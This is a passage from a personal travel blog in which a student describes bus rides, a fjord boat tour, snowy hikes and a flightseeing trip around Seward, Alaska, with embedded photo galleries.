to make a big fool out of\nmyself.</p>\n<p>I really don\u2019t understand the desire to show off, but I remembered\nthis as a need for several years. I wanted people to notice me, even as\nan anonymous person on social media, to acknowledge my skills and\nwhatsoever. It is weird, perhaps because I am facing such a difficult\ntime at school, and losing all my confidence academically that I want to\ntry to get my skills verified for another way. It is still so stupid, I\nmean, showing off doesn\u2019t increase my skills, it only makes me a\nclown.</p>\n<h2 id=\"looking-forward\">Looking Forward</h2>\n<p>Anyways, time shall pass, and I did grow a lot mentally these past\nfew months. Sometimes time is magical and changes everything, so it\u2019s\nbest to keep on and try to figure out what to do for the day.</p>\n",

The lyft drive was\nso fast and I got to the station at 526 am more than 1 hour earlier.\nEarly morning is so struggling for me, but I feel pretty well today.</p>\n<p>I walked around in downtown and the sun was just rising over the\nmountains, it was so beautiful. But there are some homeless people\nsleeping on the ground so I tried to avoid them.</p>\n<p>However, due to an avalanche the train was cancelled, and instead\nthey offered a bus service from Anchorage to Seward with the same\nschedue, so I got on the bus and I am stuck on the road now.</p>\n<p>The drive was so beautiful, almost otherworldly. It made driving\nalong the highway very tempeting for me, and I will try it some time in\nthe future. But back to the bus drive. We first got out of Anchorage,\nfrom downtown to midtown, and along Seward Highway. On the road I\nrecognized some places I hiked the day before. So much faster with\ncar!</p>\n<p>The driver is very interesting man and acted as a commentary along\nthe way. We have 2 stops along to take photos and stretch, and they are\namazing stops.</p>\n<p>We went around Gulf of Alaska and the driver explained that it was\ncalled turnagain because that the tide rise and fall so quickly, and\nthat at 6 am in the morning it is highest, but by the time we got to\nSeward the Gulf would be almost empty. Captain Cook discovered this\nplace. Also, they couldn't construct a bridge across the Gulf because\nthere are only mud in the mountains, no rocks.</p>\n<p>The driver said that we might spot Dull Sheep or Bears on the road\nleft of Seward Highway, and \"call [animal] left/right if you saw\", then\nsomeone called dull sheep left. But I didn't see anything, and we just\npassed. The driver also said that there might be seagulls, swans, or\nsomething. Then we saw a trail of snow or ice which covered the tracks\nof the train and the driver suggested this is the avalanche that cuased\nthe train to cancel.</p>\n<p>The driver explained that there are no ecosystems in Turnagain,\nanimals come and go, and that sunlight cannot penetrate the water. Then\nwe passed to Girdwood and on my right there was many dead trees, to\nwhich the driver explained was once Girdwood, but in a 9.6 earthquake in\n1960s it caused a large tsunami, which flooded nearly all of the sea\ncities, including hope and sunrise. The dead trees are salty and rocky,\nnot like rotten dead trees, since they drank the salt water in the\ntsuname.</p>\n<p>Then we stopped at Girdwood as some passengers may be getting on the\nbus, I run around and took some pictures. There was mountains all\naround, and covered with snow.</p>\n<p>Then we kept moving and got higher and higher, to a parking lot where\nI could walk on the snow. The snow was very soft and when you stop on it\nyou leave a big footprint. I nearly got my shoes wet. I didn't walk far\nbecuase the stop was only 15 minutes. I could see the snow and ice\nstretching all the way to the top of the mountain. The scenery was\nbreathtaking and I took many selfies and let someone else took a photo\nof me. On the mountain among the rocks I can see remains of avalanche We\ngot to Moose Pass, where it was a small town with few hundred people,\nand that there are not a gas station. I spotted an elementary school and\nI wonder how it feels like to study there, since there are less than\n1000 people there might not be enough students for even 1 class. Then we\npassed the Trial Lake. The lakes here comes from glaciers and is\ngreeish-blue. The lake is so calm and beautiful and I thought about the\nlake and mountain I saw in Switerland but couldn't recall much since\nthat was many years ago. We went along Kenai Lake, and we are currently\nstopping with Kenai Lake under our feet. The Kenai Lake is shaped like S\nor Thunderbolt, and it is very very long. It is the best place for\nSalmon fishing, and they would go \"combat fishing\", shoulder to shoulder\non the ground.</p>\n<p>The mountains are covered by green pine trees and bushes up to a\ncertain height, then it begin to get white.</p>\n<p>The driver said that there are only 3 seasons in Alaska, winter,\nalmost winter, and construction, and since it is expanding this highway\nthere is only 1 way to go, and nwo we are on the way again. It is\nraining hard at this time.</p>\n<p>We arrived at Seward pretty soon, and I went looking for Orange Bike\nluggage service. Turns out the door is locked but there are 2 young\npeople with the tag on the road, so I deposited my bag. It was like 11\nam, and it was raining so hard the town looked worn down, and there is\nalmost nothing I can do. Then I went to Kenai Fjords tour which I\npreviously booked in 517, and I asked if I could change the date and\nthey said they could, and I got on the boat at about 11:30 am.</p>\n<p>It was raining pretty hard. Only as I got on the boat did I realize\nthat I haven't been on a real cruise before. I did remember going on a\nsea or lake a few times maybe, but the ship is so slow and so peaceful\nthat I could barely feel anything. However, today it is absolutely\ndifferent, as it was rainy and windy, and when I went on the deck the\nwind blew so hard that I couldn't stand without hanging to the railing.\nAnyways, I went back inside and found a seat at the front of the boat\nacross 2 elder woman, and they asked me to take a picture of them and I\nasked them to take a picture of me in return.</p>\n<p>The boat was almost like riding on a rollar coaster, as it goes up\nand down. I couldn't even stand at first. But eventually I got used to\nit. I saw some young people going outside at the front of the boat, so I\nwent out too. The wind blew water in my shoes, but it was fun standing\nright there nevertheless. We kept going and it felt more like a cruise\nout to the sea than a national park tour, as I had imagined. The captain\nhad a harsh and deep voice, and I couldn't hear him well inside the\ncabin. The captain announced we are going 110 miles, and off we\nwent.</p>\n<p>After a while I heard the captain call \"orca\", and the ship slowed\ndown. Many people went out to shoot photos. There is a black tail there,\nand the captain explained that it is the fastest swimmer, going as fast\nas 30 mph. Then the ship started again. The mountains are surrounded by\nfog, and I couldn't see much. Everything around looked misty and\nmagical.</p>\n<p>Then we went to see glaciers, and it was the most stunning thing I\nhad ever seen in my life. It looked so pure. There are floating icebergs\non the sea, and as the boat went around I could hear crack crack as the\nicebergs hit the boat. I saw like 7 people kayaking around, and it had\nalready been quite a time on the speedy boat, so I don't know how these\npeople had managed to get all the way here, and how they had managed to\novercame the freezing temperatures. It was very cold outside, and my\nfingers went frozen. Almost everybody else had gloves. There are eldely\ncouples and young man, mothers bringing their young children. It was a\nlovely site as everybody was taking photos and selfies and looking\naround.</p>\n<p>The glacier came between mountains, and it was sort of white-blue\ncolor. I wonder if there is some fantasy kingdom on there, as it looked\nlike in those disney movies. The glacier looked too magical, coming out\nof nowhere and shaping itself in beautiful curves. There are icebergs\nfloating all around, and they stretched in all directions, all the way\nto the mountains. Then one of the crew members picked up one iceberg\nwith a fishnet, and showed it to us to touch, claiming it had been there\nfor hundreds of years. I couldn't describe it better in words, but after\nseeing that I find the trip very worthy.</p>\n<p>Then we went to see a second glacier, and I heard noise of ice\nfalling to the ground. Among the iceberg there is a whale, and it would\noccasionally come up to the water to breath the air. There is also a\nsmall hill with no trees, and there are some caves in it.</p>\n<p>I got very sleepy since I didn't get much sleep last night so I dozed\noff. Then it was 4 pm when I woke up, and the rain stopped, the day\nbecame cloudy and rays of sunshine penetrated the cloud to the\nocean.</p>\n<p>Then we went to see seals, and there are fat, slippery and cute just\nlike in documentaries, where polar bears would try to snatch up as their\nfood. There are many seals resting on a rock on the ground. But there\ndoesn't seem to be polar bears here. The ocean became blue as we came\nback, and the mountains were clear. We then went to Fox Island to pick\nup people, and I wonder how it feels like to live on the island.</p>\n<p>Then I think it is time to call it a day and I went for my luggage\nand came to the airbnb. I think I really love Seward and I am enjoying\nmy days.</p>\n<h3 class=\"photos1\" id=\"photos1\">Photos</h3>\n<p><br />\nSunrise<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/yXInqKS-DNSRqHZw8QnaxejYm-rgeS6SIK-_0P0AVlyKDizKl9BrKuOhcT1aGE6NYsQ_DsMcBh2Uq3qPZgOf732oz-7YrQbaIFUpPVPtJVQeuSyWiFAYnY3j6VZKDHbvffS0kFu5d4bACujxPajcW_4=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nTurnagain Arm<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/HltZzQ87ouSoxWHqlhfxMtqR44jGsG3JsX9Mh7ausnlowqanI2g6d7M_1sxveezI8g8j0p6dxlOQB1R37cOVt4LIONLt6Z3G_FsvzffAOLK4_riYZeCkKY2Dt7pNylP4fOeTQZOotdgi-u8fKSBlrvU=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nGirdwood<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/dKGlxosdgCPf20CTmE_8-FxPpzgJ8T8d7xRM5Jb7rQjP0dVkuu8grSWWR-rNeb9xGOYzK-yptGntOqoJ9sOhyZmt7zHgnMzn0aDjXfm7vAMVaHZZpjmSE5IsGls3NGONqYce5qR25RJwoaVPaLJXrts=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nChugach National Forest<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/GinQGeWBKGHXIQzyaBGS3FOaclbU-VENdDLLSx9UDuztL4jOPC7q6z1ZJn3qSxlspCEr0l98vAW8jD_xy4D37TFz6zmdtiOr4REqpFhBLULbOzF3mjcnNld7FgleuWZhTOmUZrFq7BHmeqRZMhQk9Ys=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/sdvHow7voBlZ-PQQ_pPwgGwU0NsspIGTdbYVGaWZ9KR0mKes48VdneL7UozZB-Zeb7Hze23dsVyDN7no5xJjowd18gHbP50l8zHuq8xndaTxFN_ZoA6JMMkEXcxCmabdrrN2dQytSsYES0o1FPzPLIU=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/97-tHgFFuZAImkYhG-AfUE2wOvx2Qudg3-uUZQaEa7Tt2Wvs60CgPe9WlJh_gb1r3SJNy7sq0DeHoLSPHlf0e3Jy0w98m3meurRdNdbz6wtJNotFmI4J71iR9UQRV-0hiDrQTYNsBJgcjcuw509JUjc=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nJerome Lake<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/gRgsodj9ANJSXTwnnTJaFrnYnoPL7gPYRgLxxlVUr6d23h9Oj0iega1zSIU9rg6JqfspZVt_3Qh_ptTtCv3eG1J0G3lkmPlBB9uhehvDl6Odc97_DqtWjBIda4qV7M6V59au26QG_RMgYWyceGQrYjw=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nTrail Lake<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/lgJirvDwS9YnewytJFQYr9uhc0ehzbsp0gn-dq7ZB5mOhnvq_A5M1MpnjTVl89wFZIblIQjAOU0EZr9DICCiqUakaTFrbaRfCdlfMtvo2zdqOe-xh-6sYxxZM8eK6oOblZiQLRmUliuXJj_XuVtMh28=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nKenai Lake<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/cuKt1FGQuT9iOF9OBHJ2KKeU2g6NBjbOky8_oNvM3eb0jIkzE2N16dGemQeymjR9DDYrJhaRstUG5m_UETQq80r75ZOr9lUtMoPF2y1s6xR6QHoE1SpT60fgnzxkaJTDF6NRROViysPOj7ySnWkhK9I=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nKenai Fjords Boat Cruise<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/psnjgdPs2m9Tdkkypz3VwPaUdy-7_--qBNo1llGzVbTqmhVW90TqH70eGgWCiqMu233sIXiolKjXO1WiLq6D6IPMSGhYYTSvaARTsDX0ixgNPaHtyM21ejf-Dac_vyFvOuXI7j-IjAULi6WlyuuI1lY=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\n<br />\nHolgate Arm<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/lFftsL36oyLqECXuvB42lTnOVALk6WfNBJzLjtXhSBzxatx1wL257tpj0RynCEhzbTa5UYDeNmuquFKj_5LzE1AdILxbCkb9OGH0JO7Ps_dvdRwJ6BN9qzU9uOmV9KlrgUC9s94tvmadE8R5sxy5k0Q=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nHolgate Glacier<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/wkOezc5UAJQoE08XNJgbVdeHYlTCma7-0Mn4yeSZ1H0rheGSA-TwSAgzUPc1hRx0f-nheNK8JgNVbe2jSyTKBPXZkBGfcRPC8jMKuN4343CfEPmY0AGjtHhm0u8Z_ZfvPbYsLjE5vEIfga78pgjb6rg=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/asdkRWC0KiDG4qOCA4fgxwcMXhYaQOE7qgdE6admodeGUJAcoNC7YwM02s1QDeX9e0KjK_kSRLicNftHSL1acKaPaV2H2XkyD9pi5DL8onTWE_pvuEmbVs15xxzRzxyL0-3JAQahue7bNGOX1_KWe30=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/By288CkP9DzLQErT8_qTSj8EMopdVVzCY9Dznv-UolWtYHfgOpC1OdYeHXcyIFvYlIC42UeZsh0RebEDFqV78G1dJyFNfHFTUGAD0N9ATLv4NbD4RL36A5GTVfj0eBguMs6byLPcVQUUhaxCVSj-spk=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nAialik Glacier<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/T_RT1lyoAgDO0XfEEm7suqCyyyrsPW898kj41zUHEYe9q9oJOmsjK7QJZTf43_N0uvzfrm7f8p7HDS7Zw8FhSDk5l3CnPyaiQNPzQeJVWOakcC4RRApJa5P5gksz5ff0jWvlxzdrJIQkWqIMx-kJHyU=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nDerby Cove<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/c6B5hr4yuMKCBaPlGlvVuRwFmV1RbfEspGs0tw2JfeSGRrYTFdereYtFdrxxDJfAJQYTpfjgq-cgKiuRsJznlRU6uUvNuMFew0NLz4Hn5C2L6k16b1VNkrm3d4gmc6zpR0k8EG9DcS4rbjNW0TwFUSY=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nAirbnb 3rd Street<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/qtUFmIsWU0b4X786dNtJaEVTyyWqmBmyYvvc8qSm2qb2J4NMA2ESFUVdys7utFC99O9QCVOShJWpL-eJzVWvcwIs0W6calTDY5fPLPyfsBU0ByoWIWSejw_kLLlXmKyx3WDYxK0GGBOFTN6ItozfNaY=s800\"\nstyle=\"width:80.0%\" /><br />\n</p>\n<h2 id=\"517\">517</h2>\n<p>Today is 517, and I slept half of the morning. The airbnb wasn't as\ngood as the last one, and in the morning the cars were very noisy.</p>\n<p>Then I wanted to go to the Seward visitor center. I first went out to\nthe two lake park, and there was a woman with a huge white dog. The dog\ncame after me, and the woman shouted \"friendly, he is friendly\". I\nmanaged to get away and went on the opposite direction to see the\nwaterfalls. Only at the park did I realize that I had been walking on\nwell-constructed roads nearly all my life, and hadn't seen a trail\nbefore. The trails are just basically a place where there are not a lot\nof plants going, that you can get through. I went to the waterfall, then\nwent back, and there was the woman and the dog again. This time it\nwalked up to me, and I was so scared, but it merely stopped in front of\nme and looked kind of cute and the woman smiled and said \"sorry\", to\nwhich I replied I am afraid of dogs. Then I walked to the 2 lakes and it\ntook me a long time to get out, and I was kind of sore.</p>\n<p>I was wanting to get a breakfast or lunch, and went to Ray's\nWaterfront. The servants are really nice but the price was so expensive.\nI ordered a hamburger and a dessert and it took me 40 dollars. I thought\nthat I would never eat at such a restaurant again, and that I would\nalways go eat and subway or something like that. Although it said only\nhamburger on the menu, the dish turns out to be hamburger and fries, and\nthere is a steak and some bacon and some mushroom in the hamburger. I\ndidn't even finish the hamburger, out of my expectation, since it is\nvery large. I then asked the people in the restaurant if it is plausible\nto hike up Mt Marathon, to which they replied that it is best to go with\na mate, and there is snow on top. I wanted to go to Seward visitor\ncenter but it was 1 mile away, and I didn't want to walk anymore, so I\ncalled them instead and asked about the trip. I took the whole dessert\nback. However, I spilled part of the dessert in my backpack, causing my\nbackpack to be flooded with milk and cream, which covered my pen case\nand water bottles, and I had to take time to clean it up.</p>\n<p>Then I went to Mt Marathon. There is a 5k race every 4th of July at\nSeward that is kind of a real popular event, and many people came to\nrace on Mt Marathon. But it was only mid May now. The trailhead is 100m\nfrom my airbnb, and when I walked up to it I saw a sign that said not\nfor inexperienced or unprepared, but the trail looks good enough, and it\nsaid \"jeep trail\", which I am guessing is for jeeps, so I climbed\nanyways.</p>\n<p>It is steep and I took many rests along the way, but overall not that\nhard. I was afraid of bears but fortunately I saw no animals, well\nexcept for maybe birds and squirrels. After the Jeep trail the mountain\nis covered with snow, and there was nothing I could to do to keep going,\nand that is about 1/3 of the whole trail. I was stil fresh, and walked\nalong a waterfall for a while and took some pictures before turning\nback. In total I met 3 people on the trail today, with one experienced\nmid-aged man going up and down very fast, saying he is going up 2 times,\nand an elderly couple, who didn't went up the trail much and said they\nwere only there for 2 hours.</p>\n<p>Then I went to Lost Lake trail. I wanted to go somewhere and went to\nHarbor 360 and asked how to go there, and they said there is shuttle but\nsomehow I didn't find any information of the shuttle on the Internet and\nthey said it is best to go in a taxi. So I went there in a taxi, and it\ntook me 25 dollars, and 50 dollars round trip, which I found very\nexpensive.</p>\n<p>So I went to the start of the trail and wanted to began hiking.\nHowever, there is a water spring blocking my way, and I suddenly began\nto feel a little sleepy. I wanted to find a way to cross the spring but\ncouldn't, and the road around was covered with snow. In the end I\nfinally stepped right into the icy water and crossed it. Then I went\nhiking and the trail was very rough, partly covered by snow. Halfway up\nI saw a man and I said hi and asked how far could I go. He said he went\non for 2 miles before turning back. The path is so hard I am always in\ndanger of slipping, and there are 2 trails, summer trail and winter\ntrail. I thought that since it is closer to summer now I would take the\nsummer trail. The trail is mainly small rocks and tree roots, and there\nis snow everywhere and snow is melting, causing the mud to be very wet.\nThere are bushes, but those shortcuts are hard. It is really hard\ncourse.</p>\n<p>However, the summer trail is just covered with snow and full of ups\nand downs, and before long I had to turn back since there is a cliff and\nwith so much snow it is very dangerous, and I had already climbed a\nmountain a little today and wasn't that fresh, so I turned back. Then I\ntried going to the winter trail. I saw two woman, and they were also\ngoing into winter trail. Somehow the winter trail is much easier than\nthe summer trail, and although they are both covered with snow winter\ntrail seems it is designed to be like that, and the road went on quite\nsmoothly. However, I was very tired in my legs and my water is running\nout, so after about only 1 km I turned back. Literally the snow was so\nhigh that I tripped and half of my body went into the snow. I didn't\neven go to the point where I could see views because there are too many\ntrees. The two woman looked prepared and kept going. During the way down\nI bumped my foot a little, and had to step into the icy water spring\nagain. I called the taxi and it picked me up. Then I searched the map\nand it was like 14 miles, which is like 22 kilmeters all the way, and I\nam not that well prepared anyways. I looked at photos online where there\nare trees and flowers and the trail seemed so beautiful in the summer\nwith no snow, and I was like, how bad is it that I came in such\nconditions. It is only mid-May, and I figured that it will take about 2\nmonths for all the snow to melt. Anyways, the day is long and hard, and\nI didn't actually see much, but it is still very unique first-time\nexperience for me.</p>\n<h3 class=\"photos2\" id=\"photos2\">Photos</h3>\n<p><br />\nRay's Waterfront<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/pzOCQzUS_lxgMFNXm2q1sHELHDUVu61EAMndwRcx57RLwkW1Hg5ckG0je-JSJ_tDnP2W3I1eQVOxOWLlWaROO0-drUIPWpXLUVjBmueDFmLqcsBhk9Lfhr1EgLiaLpXDa1T6x4sli3YR_nqa0Maezwg=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nMt Marathon<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/A_jVFoYzd7auni0xsMC4AclRRbjwti2MzLkE1QZsgsrqZ-GVu5YRjdDUEx-124gzHhTqb0gLAGGXD7n16JlrCtzuXgj36V1qogAULys32adjHLpiyC2QrJsX_7RJ2u6k9ppaFIri-8idS3HFcgbz2do=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/KsiwDNr2OtCJ6glx_5rv-9mnNqk_W5dTJQLU3JQhWHcZNvbkOh1ptQB1joTfPAFX4slmWptBHsSFuF_70AhfhbzKu1P7h7hZcoevTKFaB58qrWXnUxO1GQS9KjWuGWteOLeCqRj2l6PloyRhlgqb0H8=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\nLost Lake Trail<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/QYWHgojcHLatHMkpkzDM9c4gwLqD18ihTkn2uyIvvuW1EM9w4ItK1G0JxmJ6wE2-JstGqSk_TNPyj1pL7-hbXYRO_3y9w4QOgL4ZC2ceA2WhgIFOAIHo3aZgMhW_K3wb28JWZx4TtWrdBSpmgDXmBJo=s800\"\nstyle=\"width:80.0%\" /><br />\n<br />\n<br />\n<img\nsrc=\"https://lh7-us.googleusercontent.com/gTR_uvlptQ3DIZungebcQRt2CIpXfDxhJjtUK3fExtxWzjTPc_YcNmc-MkvvtQa4yHK-h-XDy2TSIwWvvVyHoRZ8g2cZ2uhOHYxiRY2uGntW6O1fsIV_3PpCBnTSA4FoJ0zQySixgTnV5mWMd00Svro=s800\"\nstyle=\"width:80.0%\" /><br />\n</p>\n<h2 id=\"518\">518</h2>\n<p>Today is 518, and it is halfway thorugh my trip. I am boarding the\nbus to Anchorage now, and hopefully I will be in Denali tomorrow\nnoon.</p>\n<p>Today I went flightseeing. It was originally scheduled at 10 am, and\nI woke up at 8 am to walk there. It is very hard getting up at 8, and it\nwas a long walk. I walked passed Seward High School and the Ryan Lewis\nMemorial Field, and there are some people playing soccer and frisbee.\nThey are very young, and I figured that they are probably the students,\nand I really wanted to join or have a conversation but I am quite\nsleepy, and need to go to AA Seward Air.</p>\n<p>When I finally went there, which is a kind of hard walk, and my legs\nwere sore. The winds were blowing so strong this morning I felt in\nblowing right in my face, and I went in the little house and chatted\nwith Malia, a worker in the AA Seward Airline. There are many brochures\nin the little house, and I thought about Kayaking adventure and\ndifferent hiking routes I didn't even try, and thought there are still\nso many things I can do. She asked where I came from and what I was\nstudying and had I been on a small flight before, and how there was this\nsnowstorm 3 weeks ago that made mountains still covered with snow, and\nthat in normal years snow would have melted. I learned that the pilot is\ncalled Joey Smith, but he is also kind of mechanics and organizer and\ncommenter. It kind of made me want to be a pilot someday. However, after\na while, she told me they couldn't fly the plane this morning, and I had\nto join the afternoon tour at 1 pm. I thought how I could have slept all\nmorning instead of waking up at 8 am,, but the tour at 1 pm is more\ncostly, so it turns out to be a budget, but still, it is very expensive\nto fly anyways. They offered me a ride, and I said I wanted to go to\nSealife Center, so they took me there in their car.</p>\n<p>However, sealife center is very small. There are only 2 floors and I\nsaw Seastars and Seals and Sea Lions and Shrimps and Anemone and Skate\nand Salmons, and some kind of birds with a strange voice. The birds were\ntrapped in a net so they can't fly out. I ended up getting out in less\nthan 1 hour,, and there was still some time left before 1 pm. The wind\nwas very strong outside.</p>\n<p>Then I went to the Waterfront Park, the view is fantastic, the snowy\nmountains rising on the otherside. There are some kids halfway on a tree\nand they smiled and said hi to me. Then there is a pavilion where\nsomeone is having a barbecue and it smells so good. But it is kind of\nprivate. Then I saw a playground where there are kids of all ages, some\nalmost my age I think. They are playing happily on the swing. Then I\nkept going, and it became so windy that I had to get my hat on, and\ncould barely walk. I went to Firebranch BBQ to have lunch, which is kind\nof delicious.</p>\n<p>Then I walked to AA Seward again, which is like 2 miles walk, so I\nended up walking 4 miles in total, which made me sore. I walked on the\nrail track, and got there in time, at 12:30. Then I saw Malia again, and\nit urns out that I would be flying with an Australian couple. The\nelderly couple was really nice, and introduced themselves and the big\nman shook my hands and said Hi Jim, and told me he was Rob.</p>\n<p>Then we flew on the plane. It was my first time on a flight, and I\nwas so excited. I had those life jackets on and they also suggested me\nweating earcovers with microphone as a way to communicate, since it was\nvery loud, by normal voice people cannot hear each other. There are 3\nseats beside the pilot's seat on the airplane, and it is sort of formed\nlike a car.</p>\n<p>Then the plane took off, and in a matter of seconds the town of\nSeward went small, and the pilot Joey Smith said we are going to see\nglacier, and off we went. Everything just seemed so spectacular on the\nairplane. I had seen some glacier on the boat, but on the plane it\nlooked totally different, and we went straight over, and I could see all\nthose oddly shaped icebergs on the ground. Occasionally there is a blue\npond, and it reflected in the sunlight. The glacier is just dazzling,\nand I was taking pictures the whole time. The man chatted with the pilot\nabout how to tell winds, and it seems the man had some experience with\nflying a plane.</p>\n<p>On the way there was a bear on a beach, but it was on the other side\nof the window. I also managed to take a picture of the bear, and it is\nthe first bear I saw on the trip. I figured I would probably be seeing\nsome in Denali. I kind of wondered why sometimes the lake shows a\nreflection of the mountain and sometimes it doesn't. I then thought that\nthis is as good as those scenery films on YouTube featuring like\nSwitzerland or Iceland, with floating icebergs from the glacier, and all\nthose beautiful shapes carved by snow. Most of fresh water comes from\nglaciers.</p>\n<p>Then we went to Harding Icefield, and the pilot said there are some\nglacier climbers he had just dropped off here a few days ago, and they\nare camping down. We managed to get a pretty close look on them, and\nseems to me glcier climbing seem so interesting. We were going past the\nHarding Icefield, and it looked like a white desert, so pure and so\nwhite that I could barely open my eyes. I was amazed by this massive\nwhite down there. It purified my heart, and I looked at the harding\nicefield and it gave me a sense of calmness when I thought about\neverything else. In the ground snow covered everything else and white is\nthe only color, and I thought that maybe after a few hundred years after\nmy death my life would be kind of like that, with white covering\neverything and leaving not a trace in the world. I am yet to go to a\ndesert, though. The pilot said that if we land down there the snow can\nget all the way to waist. I kind of wanted to go to Harding Icefield\nTrail but it was closed. Then we circled back.</p>\n<p>Then the flightseeing tour ended and it was really fantastic. Then I\nthought that a bird could easily do that flight everyday. However, a\nbird can't talk or be as smart as humans so anyways, and we were saying\ngoodbye when the couple noticed I was walking, so they offered me a\nride. I was touched and so grateful fromt he kindness of strangers, as I\nbarely talked with anyone all year long, and barely know anyone would\nhave such kindness in their hearts. So I got in their car, which is big\nand contain a table and 2 beds. They are very kind and let me sit in the\nfront. I kind of want to rent a car too. I thought about coming here\nagain in summer of 2025 when I would be 20 years old, and I would learn\nto drive and rent a car like theirs and drive up to Prudhoe Bay alone,\nand how I would see the Arctic Ocean and the northern lights, and hike\nto the most beautiful places in the world.</p>\n<p>The man told me they had 60 kangeroos in their backyard, and when\nthinking of backyards I was like thinking about the 30 square feet yard\nthat people in the first floor would have, and it felt too amazing to\nbelive. Then they told me their backyard was 9 acres, and I found that\nit was something as large as 10 football fields, and I couldn't help but\nget amazed even more. Then they said it wasn't even big in Australia,\nwhich made me wonder just how different are people's life around the\nworld, and I have no knowledge at all about the world whatsoever if I\nstay in Shanghai my whole life. They dropped me off at Harbor 360, and\nthe woman gave me a doll with Australia on it, and I was so grateful for\nthe gift. I thought about going to Australia one day, and it turns out\nthat I forgot all of my times in New Zealand.</p>\n<p>Then I saw a free shuttle and I hopped on it, and the driver was like\nwhere are you going, and I was like I don't know just wanna go around\ntown. There are about 20 other people on that bus, so I went around and\ngot off at Sealife Center again, because I didn't know where else to go\nto. Then it was like 14:23, and I figured that since the bus departs at\nlike 6 pm I stil had lots of time to do whatever I wanted, and I thought\nabout going around and turning back at 4 pm. I first went to the Lowell\nPoint Waterfall, which is quite small. I was at kind of south end of\nSeward and didn't know where to go, since Caines Head was like 2 miles\naway and there are no trails besides Mt Marathon that is less than 2\nmiles away, so I settled with Mt Marathon, and I decided I am climbing\nit again. Since I was climbing the hiking trail yesterday, I figured I\nwould be climbing the racing trail, and I went to the trailhead\nyesterday and a man explained to me where the racing trail was--at\nJefferson Road. So I walked to Jefferson Road and went in and tried to\nclimb it.</p>\n<p>However, the path is so treacherous. I never saw such a primitive and\ndangerous path ever before. I first saw the cliffs, but there are\nsliding rocks just everywhere, it is just too dangerous and not even a\nway to go. Then I saw another trail and went up a little and found the\nwaterfall switchback trail, and I figured that it is the \"easier\" trail\nand I would like to attempt it somehow. The path went up a waterfall,\nand it was so steep like 40 degress up. There are leaves and mud and\nfalling rocks everywhere on the way, and it was just impossible for me\nto climb with a backpack and my jacket in my hands, so I put the jacket\nin my bags. I climbed like 30 meters and couldn't go on anymore, and it\nfelt truly like rock climbing. There are many rocks that is not stable,\nand there is no place I could get a firm hold on or put my feet on. At\none point I was almost sliding down the mountain, and kept myself not\nsliding with my arms almost underneath me. And there is nothing I could\ndo except turning back from the racing trail before going through the\nfirst like 50 meters.</p>\n<p>And then I began to climb down, and I realized how hard the trail was\nagain. Turned out that I crawled on all fours with my butt on the ground\nand my backpack in my hand, and I got my pants all covered in dirt. But\ngoing down is much safer. Then I saw 2 people, probably a couple, coming\ndown and they were going so fast on the impossible trail for me and they\nlooked as quick as a rabbit, and as easy as walking on the ground.</p>\n<p>I thought that since I had grew up in Shanghai, a crowded city where\nthere are no wildlifes and no mountains and doens't seem to be exposed\nto any kind of nature except those artificial small trees and tinny\nponds in the school or something like that, I have no experiences with\nthe mountains or rocks. I imagined myself going up the treacherous trail\neveryday instead of playing in Century Park, and camping outside and\nhiking alone instead of spending most of my time in cram classes, and I\nthought that would be so fun, and this path shouldn't even be hard for\nme. However, I could not go back to my childhood, nor could my parents\nafford it anyways, and I thought that maybe if I come here after\nobtaining maybe a higher degree and be a professor or something, then I\nwould have the chances of exploring nature pretty much all the rest of\nmy life.</p>\n<p>Anyways, I said hi and since I was lying on all fours they jumped to\nthe other side of the waterfall and went down really quickly, and before\nI took one or two steps they were at the ground. I finally went down the\ntreacherous path, and they were just driving away in their cars, and we\nsaid hi again. I said I am visiting and they said good job, and the 3\nmile up the mountain are the hardest in the world, the waterfall part\nare very hard and it will be easier up there and they congratulated me.\nSo I was happy again. I kind of wanted to go up there but anyways I was\nlucky to go without injuring myself. I went to the railroad depot and\nboarded the bus.</p>\n<p>Then it became time to say goodbye, and it became very very sad--I\nnever want to leave Seward, and this is almost my favourite place so\nfar. Alaska is so much better than Berkeley, where you cannot even eat\npeacefully at a Macdonald or Subway, where there are too many homeless\nand beggars and strange people that walking on the streets downtown\nyields a feeling of disgust, although the surrounding area is ok. But I\nfigured I have been to most of the surrounding areas already\nanyways.</p>\n<h3 class=\"photos234234\" id=\"photos342342\">Photos</h3>\n<p><br />\nSeward High 